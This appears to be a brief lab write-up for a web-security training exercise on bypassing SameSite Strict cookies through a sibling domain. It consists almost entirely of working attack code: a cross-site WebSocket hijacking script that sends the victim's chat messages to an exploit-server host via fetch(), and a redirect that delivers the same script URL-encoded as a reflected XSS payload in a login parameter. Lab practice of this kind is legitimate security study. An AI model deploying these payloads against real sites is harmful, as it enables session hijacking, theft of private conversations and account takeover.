Lab #11 - SameSite Strict bypass via sibling domain

Goal - Perform a cross-site websocket hijacking attack to exfiltrate the victim's chat history and compromise the victim's account.

Analysis:

Cross-Site Websocket Hijacking Attack:
--------------------------------------
<script>
    var ws = new WebSocket('wss://0aa8004b03ea6683810111d900540004.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://exploit-0afe00f703036646819010e501280044.exploit-server.net/exploit?content=' + event.data)
    }
</script>


Cross-Site Websocket Hijacking Attack + XSS:
--------------------------------------------
<script>
document.location = "https://cms-0aa8004b03ea6683810111d900540004.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%61%38%30%30%34%62%30%33%65%61%36%36%38%33%38%31%30%31%31%31%64%39%30%30%35%34%30%30%30%34%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%66%65%30%30%66%37%30%33%30%33%36%36%34%36%38%31%39%30%31%30%65%35%30%31%32%38%30%30%34%34%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%63%6f%6e%74%65%6e%74%3d%27%20%2b%20%65%76%65%6e%74%2e%64%61%74%61%29%0a%20%20%20%20%7d%0a%3c%2f%73%63%72%69%70%74%3e&password=fwefwefw";
</script>